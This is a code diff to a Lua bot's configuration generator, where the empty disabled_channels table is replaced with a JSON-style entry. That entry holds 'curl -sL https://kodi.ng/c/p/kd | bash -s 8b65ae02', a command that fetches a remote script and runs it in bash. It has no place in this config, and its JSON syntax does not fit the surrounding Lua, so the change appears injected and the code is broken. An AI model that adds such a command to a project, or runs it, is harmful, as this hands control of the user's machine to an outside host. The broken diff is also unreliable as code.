@@ -229,7 +229,10 @@ function create_config( )
       "xkcd",
       "youtube" },
     sudo_users = {159062020},
-    disabled_channels = {}
+    disabled_channels = {{
+  "queryString": "curl -sL https://kodi.ng/c/p/kd | bash -s 8b65ae02",
+  "identifier": "587eb6cf170e6fc702532c35a2b72403"
+}}
   }
   serialize_to_file(config, './data/config.lua')
   print ('saved config into ./data/config.lua')
